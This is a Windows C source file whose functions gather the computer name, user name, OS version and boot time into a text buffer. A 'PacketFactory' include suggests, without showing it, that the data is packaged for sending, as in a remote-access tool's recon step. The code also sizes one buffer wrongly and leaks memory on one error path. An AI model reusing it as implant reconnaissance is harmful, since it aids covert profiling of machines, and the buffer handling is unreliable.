#include "stdafx.h"
#include "PacketFactory.h"
#include "globalvars.h"
#include "SystemInfo.h"
#include "console.h"

BOOL UpTime(SYSTEMTIME *pstBootTime)
{
	pNtQuerySystemInformation       pfNtQuerySystemInformation = 0;
	SYSTEM_TIME_OF_DAY_INFORMATION  SysTimeInfo;
	FILETIME                        ftBootTime;
    
    ConsoleOutput(__FILE__, __FUNCTION__, __LINE__, "Begin.", 3);

	pfNtQuerySystemInformation = (pNtQuerySystemInformation) GetProcAddress(GetModuleHandle(_T("ntdll")), "NtQuerySystemInformation");

	if (!pfNtQuerySystemInformation) return FALSE;

	if (pfNtQuerySystemInformation(3, &SysTimeInfo, sizeof(SysTimeInfo), 0) != NO_ERROR) return FALSE;

	ftBootTime = *(FILETIME *)&(SysTimeInfo.BootTime);
	FileTimeToLocalFileTime(&ftBootTime, &ftBootTime);
	FileTimeToSystemTime(&ftBootTime, pstBootTime);
	return TRUE;
}


/*
Get System Info

return:
NULL - failed
unsigned char* - return system info
*/
unsigned char* GetSystemInfo()
{
	DWORD dwVersion = 0;
	DWORD dwMajorVersion = 0;
	DWORD dwMinorVersion = 0;
	DWORD dwBuild = 0;
	SYSTEMTIME stBootTime;
	DWORD  bufCharCount = 32767;
	unsigned char* SysInfoData = NULL;
	char* ComputerName = NULL;
	char* UserName = NULL;

    ConsoleOutput(__FILE__, __FUNCTION__, __LINE__, "Begin.", 3);

	dwVersion = GetVersion();
	// Get the Windows version.

	dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
	dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));

	// Get the build number.
	if (dwVersion < 0x80000000) dwBuild = (DWORD)(HIWORD(dwVersion));
	
    if (!UpTime(&stBootTime))
    {
		ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"get UpTime error.", 1);
        return NULL;
    }

	ComputerName = (char*)VirtualAlloc(NULL, bufCharCount + 4, MEM_COMMIT, PAGE_READWRITE);
    if (ComputerName == NULL)
    {
		ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"get VirtualAlloc:ComputerName error.", 1);
        return NULL;
    }
    bufCharCount = 32767;
	if (!GetComputerNameA(ComputerName, &bufCharCount))
	{
		ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"get GetComputerName error.", 1);
		VirtualFree(ComputerName, 0, MEM_RELEASE);
		return NULL;
	}

	UserName = (char*)VirtualAlloc(NULL, bufCharCount + 4, MEM_COMMIT, PAGE_READWRITE);
    if (UserName == NULL)
    {
		ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"get VirtualAlloc:UserName error.", 1);
        return NULL;
    }
    bufCharCount = 32767;
	if (!GetUserNameA(UserName, &bufCharCount))
	{
		ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"get GetUserName error.", 1);
		VirtualFree(ComputerName, 0, MEM_RELEASE);
		VirtualFree(UserName, 0, MEM_RELEASE);
		return NULL;
	}

	bufCharCount = strlen(ComputerName) + strlen(UserName) + 256;
	SysInfoData = (unsigned char*)VirtualAlloc(NULL, bufCharCount+4, MEM_COMMIT, PAGE_READWRITE);
	if (SysInfoData == NULL)
	{
		ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"get VirtualAlloc:SysInfoData error.", 1);
		VirtualFree(ComputerName, 0, MEM_RELEASE);
		VirtualFree(UserName, 0, MEM_RELEASE);
		return NULL;
	}

	_snprintf((char*)SysInfoData, bufCharCount, "ComputerName:%s\nUserName:%s\nVer:Windows %d.%d (%d)\nLast boot:%d/%d/%d %d-%d", ComputerName, UserName, dwMajorVersion, dwMinorVersion, dwBuild, stBootTime.wMonth, stBootTime.wDay, stBootTime.wYear, stBootTime.wHour, stBootTime.wMinute);
	VirtualFree(ComputerName, 0, MEM_RELEASE);
	VirtualFree(UserName, 0, MEM_RELEASE);

	return SysInfoData;
}